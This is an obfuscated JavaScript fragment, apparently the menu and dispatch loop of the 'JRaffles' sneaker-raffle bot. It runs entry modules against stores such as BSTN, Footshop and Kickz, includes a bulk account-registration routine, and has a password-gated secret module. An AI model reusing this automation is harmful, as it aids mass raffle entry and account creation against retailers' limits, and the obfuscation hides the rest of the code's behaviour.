            await _0x3c4b04(_0x6f4bcd, _0x5a10d8['openDEVMSG']);
            async function _0x38563b() {
                _0x5c2a2f('JRaffles\x20' + _0x3c97e2), console['clear'](), console['log']('Hello\x20' + _0x3f1ec6['cyan']('' + _0x1b66d2) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x3c97e2), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x369225 = 0x0; _0x369225 < _0x34ba82['length'] - 0x4; _0x369225++) {
                    if (_0x369225 >= 0xa) {
                        console['log']('\x20(' + _0x369225 + ')\x20[' + _0x34ba82[_0x369225]['name'] + ']');
                        continue;
                    }
                    if (_0x34ba82[_0x369225]['name'] === 'Reload\x20Settings' || _0x34ba82[_0x369225]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x369225 + ')\x20\x20[' + _0x34ba82[_0x369225]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x34ba82['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x34ba82['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x34ba82['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x34ba82['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x2b0c3e();
                if (taskModule > _0x34ba82['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x4aaa24(0x3e8), _0x38563b();
                if (_0x34ba82[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x467016(_0x34ba82[taskModule]['modules']);
                    var _0x2f0ffe = _0x34ba82[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x38ba2a = await _0x325811();
                            await _0x2f0ffe['function'](_0x2f0ffe, _0x38ba2a);
                        }
                        if (taskFunction == 0x2) {
                            var _0x38ba2a = await _0x325811(), _0x19259a = await _0x49f119(_0x2f0ffe);
                            _0x343742['shuffleTasks'] && await _0x240d04(_0x19259a), await _0x2f0ffe['function'](_0x2f0ffe, _0x19259a, _0x38ba2a);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x38ba2a = await _0x325811(), _0x19259a = await _0x49f119(_0x2f0ffe);
                                _0x343742['shuffleTasks'] && await _0x240d04(_0x19259a), await _0x2f0ffe['function'](_0x2f0ffe, _0x19259a, _0x38ba2a);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x38ba2a = await _0x325811();
                                    await _0x2f0ffe['function'](_0x2f0ffe, _0x38ba2a);
                                }
                            }
                        }
                    } catch (_0x3a8ee8) {
                        console['log'](_0x3a8ee8), await _0x4aaa24(0x7d0);
                    }
                    return _0x38563b();
                }
                if (_0x34ba82[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x467016(_0x34ba82[taskModule]['modules']);
                        var _0x2f0ffe = _0x34ba82[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x38ba2a = await _0x325811(), _0x1698e2 = await _0x49f119(_0x2f0ffe);
                            _0x343742['shuffleTasks'] && await _0x240d04(_0x1698e2), await _0x2f0ffe['function'](_0x2f0ffe, _0x1698e2, _0x38ba2a);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x38ba2a = await _0x325811(), _0x1698e2 = await _0x49f119(_0x2f0ffe);
                                _0x343742['shuffleTasks'] && await _0x240d04(_0x1698e2), await _0x2f0ffe['function'](_0x2f0ffe, _0x1698e2, _0x38ba2a);
                            }
                        }
                    } catch (_0x2975a7) {
                        console['log'](_0x2975a7), await _0x4aaa24(0xfa0);
                    }
                    return _0x38563b();
                }
                if (_0x34ba82[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x467016(_0x34ba82[taskModule]['modules']);
                        var _0x2f0ffe = _0x34ba82[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x38ba2a = await _0x325811(), _0x1698e2 = await _0x49f119(_0x2f0ffe);
                            _0x343742['shuffleTasks'] && await _0x240d04(_0x1698e2), await _0x2f0ffe['function'](_0x2f0ffe, _0x1698e2, _0x38ba2a);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x38ba2a = await _0x325811(), _0x1698e2 = await _0x49f119(_0x2f0ffe);
                                _0x343742['shuffleTasks'] && await _0x240d04(_0x1698e2), await _0x2f0ffe['function'](_0x2f0ffe, _0x1698e2, _0x38ba2a);
                            }
                        }
                    } catch (_0x2543f0) {
                        console['log'](_0x2543f0), await _0x4aaa24(0xfa0);
                    }
                    return _0x38563b();
                }
                if (_0x34ba82[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x467016(_0x34ba82[taskModule]['modules']);
                    var _0x2f0ffe = _0x34ba82[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x38ba2a = await _0x325811();
                        return await _0x2f0ffe['function'](_0x2f0ffe, _0x38ba2a), _0x38563b();
                    }
                    var _0x38ba2a = await _0x325811(), _0x4ee935 = await _0x49f119(_0x2f0ffe);
                    return _0x343742['shuffleTasks'] && await _0x240d04(_0x4ee935), await _0x2f0ffe['function'](_0x2f0ffe, _0x4ee935, _0x38ba2a), _0x38563b();
                }
                if (_0x34ba82[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x467016(_0x34ba82[taskModule]['modules']);
                    var _0x2f0ffe = _0x34ba82[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x38ba2a = await _0x325811(), _0x4ee935 = await _0x49f119(_0x2f0ffe);
                    return _0x343742['shuffleTasks'] && await _0x240d04(_0x4ee935), await _0x2f0ffe['function'](_0x2f0ffe, _0x4ee935, _0x38ba2a), _0x38563b();
                }
                if (_0x34ba82[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x467016(_0x34ba82[taskModule]['modules']);
                    var _0x2f0ffe = _0x34ba82[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x38ba2a = await _0x325811(), _0x4ee935 = await _0x49f119(_0x2f0ffe);
                    return _0x343742['shuffleTasks'] && await _0x240d04(_0x4ee935), await _0x2f0ffe['function'](_0x2f0ffe, _0x4ee935, _0x38ba2a), _0x38563b();
                }
                if (_0x34ba82[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x467016(_0x34ba82[taskModule]['modules']);
                    var _0x2f0ffe = _0x34ba82[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x38ba2a = await _0x325811(), _0x4ee935 = await _0x49f119(_0x2f0ffe);
                    return _0x343742['shuffleTasks'] && await _0x240d04(_0x4ee935), await _0x2f0ffe['function'](_0x2f0ffe, _0x4ee935, _0x38ba2a), _0x38563b();
                } else {
                    if (_0x34ba82[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x467016(_0x34ba82[taskModule]['modules']);
                        var _0x2f0ffe = _0x34ba82[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x38ba2a = await _0x325811(), _0x1fa35d = await _0x49f119(_0x2f0ffe);
                            return _0x343742['shuffleTasks'] && await _0x240d04(_0x1fa35d), await _0x2f0ffe['function'](_0x2f0ffe, _0x1fa35d, _0x38ba2a), _0x38563b();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x38ba2a = await _0x325811();
                                return await _0x2f0ffe['function'](_0x2f0ffe, null, _0x38ba2a), _0x38563b();
                            }
                        }
                        ;
                    } else {
                        if (_0x34ba82[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x467016(_0x34ba82[taskModule]['modules']);
                            var _0x2f0ffe = _0x34ba82[taskModule]['modules'][taskFunction], _0x38ba2a = await _0x325811(), _0x1fec18 = await _0x49f119(_0x2f0ffe);
                            return _0x343742['shuffleTasks'] && await _0x240d04(_0x1fec18), await _0x2f0ffe['function'](_0x2f0ffe, _0x1fec18, _0x38ba2a), await _0x4aaa24(0x1388), _0x38563b();
                        } else {
                            if (_0x34ba82[taskModule]['name'] == 'Google\x20Forms') {
                                try {
                                    let _0xec69b8 = { 'headers': { 'content-type': 'application/json' } }, _0x4b8b75 = { 'key': _0x3ba935 }, _0x516901 = await _0x5ad0b1['post']('https://jraffles.herokuapp.com/beta', _0x4b8b75, _0xec69b8);
                                    if (_0x516901['status'] != 0xc8)
                                        throw new Error('No\x20Beta\x20Access..');
                                    console['log']('Hello,\x20' + _0x3f1ec6['cyan'](_0x1b66d2) + '.\x20Beta\x20Access\x20Granted.'), await _0x4aaa24(0x3e8);
                                } catch (_0x1c2b92) {
                                    return console['log']('No\x20Beta\x20Access.'), await _0x4aaa24(0x7d0), _0x38563b();
                                }
                                taskFunction = await _0x467016(_0x34ba82[taskModule]['modules']);
                                var _0x2f0ffe = _0x34ba82[taskModule]['modules'][taskFunction], _0x38ba2a = await _0x325811(), _0x1fec18 = await _0x49f119(_0x2f0ffe);
                                return _0x343742['shuffleTasks'] && await _0x240d04(_0x1fec18), await _0x2f0ffe['function'](_0x2f0ffe, _0x1fec18, _0x38ba2a), await _0x4aaa24(0x1388), _0x38563b();
                            } else {
                                if (_0x34ba82[taskModule]['name'] == 'OQIUM\x20Store') {
                                    taskFunction = await _0x467016(_0x34ba82[taskModule]['modules']);
                                    var _0x2f0ffe = _0x34ba82[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0) {
                                        var _0x38ba2a = await _0x325811(), _0x1fa35d = await _0x49f119(_0x2f0ffe);
                                        return _0x343742['shuffleTasks'] && await _0x240d04(_0x1fa35d), await _0x2f0ffe['function'](_0x2f0ffe, _0x1fa35d, _0x38ba2a), _0x38563b();
                                    } else {
                                        if (taskFunction == 0x1) {
                                            var _0x38ba2a = await _0x325811();
                                            return await _0x2f0ffe['function'](_0x2f0ffe, null, _0x38ba2a), _0x38563b();
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x34ba82[taskModule]['name'] == 'BOUNCEWEAR') {
                                        taskFunction = await _0x467016(_0x34ba82[taskModule]['modules']);
                                        var _0x2f0ffe = _0x34ba82[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0)
                                            await bwAcc('https://bouncewear.com/nl/account/register', _0x2f0ffe);
                                        else {
                                            if (taskFunction == 0x1) {
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x34ba82[taskModule]['name'] == 'PATTA') {
                                            taskFunction = await _0x467016(_0x34ba82[taskModule]['modules']);
                                            var _0x2f0ffe = _0x34ba82[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x38ba2a = await _0x325811(), _0x2350c2 = await _0x49f119(_0x2f0ffe);
                                                return _0x343742['shuffleTasks'] && await _0x240d04(_0x2350c2), await _0x2f0ffe['function'](_0x2f0ffe, _0x2350c2, _0x38ba2a), _0x38563b();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x38ba2a = await _0x325811(), _0x2350c2 = await _0x49f119(_0x2f0ffe);
                                                    return _0x343742['shuffleTasks'] && await _0x240d04(_0x2350c2), await _0x2f0ffe['function'](_0x2f0ffe, _0x2350c2, _0x38ba2a), _0x38563b();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x34ba82[taskModule]['name'] == 'SLAM\x20JAM') {
                                                taskFunction = await _0x467016(_0x34ba82[taskModule]['modules']);
                                                var _0x2f0ffe = _0x34ba82[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x38ba2a = await _0x325811(), _0x16c9e9 = await _0x49f119(_0x2f0ffe);
                                                    return _0x343742['shuffleTasks'] && await _0x240d04(_0x16c9e9), await _0x2f0ffe['function'](_0x2f0ffe, _0x16c9e9, _0x38ba2a), _0x38563b();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x38ba2a = await _0x325811(), _0x16c9e9 = await _0x49f119(_0x2f0ffe);
                                                        return _0x343742['shuffleTasks'] && await _0x240d04(_0x16c9e9), await _0x2f0ffe['function'](_0x2f0ffe, _0x16c9e9, _0x38ba2a), _0x38563b();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x34ba82[taskModule]['name'] == 'KICKZ') {
                                                    taskFunction = await _0x467016(_0x34ba82[taskModule]['modules']);
                                                    var _0x2f0ffe = _0x34ba82[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x38ba2a = await _0x325811(), _0x5792ad = await _0x49f119(_0x2f0ffe);
                                                        return _0x343742['shuffleTasks'] && await _0x240d04(_0x5792ad), await _0x2f0ffe['function'](_0x2f0ffe, _0x5792ad, _0x38ba2a), _0x38563b();
                                                    } else {
                                                        if (taskFunction == 0x1) {
                                                            var _0x38ba2a = await _0x325811(), _0x5792ad = await _0x49f119(_0x2f0ffe);
                                                            return _0x343742['shuffleTasks'] && await _0x240d04(_0x5792ad), await _0x2f0ffe['function'](_0x2f0ffe, _0x5792ad, _0x38ba2a), _0x38563b();
                                                        }
                                                    }
                                                    ;
                                                } else {
                                                    if (_0x34ba82[taskModule]['name'] == 'JD') {
                                                        taskFunction = await _0x467016(_0x34ba82[taskModule]['modules']);
                                                        var _0x2f0ffe = _0x34ba82[taskModule]['modules'][taskFunction];
                                                        console['clear']();
                                                        if (taskFunction == 0x0) {
                                                            var _0x38ba2a = await _0x325811(), _0x229482 = await _0x49f119(_0x2f0ffe);
                                                            return _0x343742['shuffleTasks'] && await _0x240d04(_0x229482), await _0x2f0ffe['function'](_0x2f0ffe, _0x229482, _0x38ba2a), _0x38563b();
                                                        }
                                                    } else {
                                                        if (_0x34ba82[taskModule]['name'] == 'Seven\x20Store')
                                                            return console['log']('returning\x20to\x20menu'), await _0x4aaa24(0x3e8), _0x38563b();
                                                        else {
                                                            if (_0x34ba82[taskModule]['name'] == 'Paypal\x20Verification') {
                                                                var _0x13ddf7 = _0x34ba82[taskModule]['name'], _0x38ba2a = await _0x325811();
                                                                return await _0x48914c(_0x13ddf7, _0x38ba2a), _0x38563b();
                                                            } else {
                                                                if (_0x34ba82[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                    taskFunction = await _0x467016(_0x34ba82[taskModule]['modules']);
                                                                    var _0x2f0ffe = _0x34ba82[taskModule]['modules'][taskFunction];
                                                                    return await _0x2f0ffe['function'](_0x2f0ffe), _0x38563b();
                                                                } else {
                                                                    if (_0x34ba82[taskModule]['name'] == 'Change\x20Settings') {
                                                                        console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                        var _0x33e811 = 0x0;
                                                                        for (const _0x2caf57 in _0x343742) {
                                                                            console['log']('(' + _0x33e811 + ')\x20' + _0x2caf57 + '\x20:\x20' + _0x343742[_0x2caf57]), _0x33e811++;
                                                                        }
                                                                        console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x33e811 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                        var _0xe50a10 = await _0x1676f8();
                                                                        if (_0xe50a10 == _0x33e811)
                                                                            return _0x38563b();
                                                                        console['clear'];
                                                                        var _0x52b4d1 = 0x0;
                                                                        for (var _0x335ec3 in _0x343742) {
                                                                            if (_0xe50a10 == _0x52b4d1) {
                                                                                console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x335ec3 + '\x20:'), _0x343742[_0x335ec3] = await _0x303958(), _0x343ecd['writeFileSync']('../settings.json', JSON['stringify'](_0x343742));
                                                                                break;
                                                                            } else
                                                                                _0x52b4d1++;
                                                                        }
                                                                        return console['log']('Settings\x20Saved!'), await _0x4aaa24(0xbb8), _0x38563b();
                                                                    } else {
                                                                        if (_0x34ba82[taskModule]['name'] == 'Reload\x20Settings')
                                                                            return console['log']('Reloading\x20settings'), await _0x4207b6(), _0x38563b();
                                                                        else {
                                                                            if (taskModule == 0x45) {
                                                                                _0x34ba82[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                                var _0x1f7d24 = await _0x1139bb();
                                                                                _0x1f7d24 == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x5e9adc(), await afewFunction(_0xd130f2[_0x43177a], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x4aaa24(0xbb8));
                                                                            } else {
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x38563b();
            } catch (_0x5454eb) {
                return console['log'](_0x5454eb), await _0x4aaa24(0x2710), _0x38563b();
            }
        } catch (_0x5ec71c) {
            return console['log'](_0x5ec71c), await _0x4aaa24(0x3a98);
        }
}
;
_0x5c2a2f('JRaffles\x20' + _0x3c97e2);
try {
    _0x4207b6(), _0x1c8cd7();
} catch (_0x5757f9) {
    console['log'](_0x5757f9);
}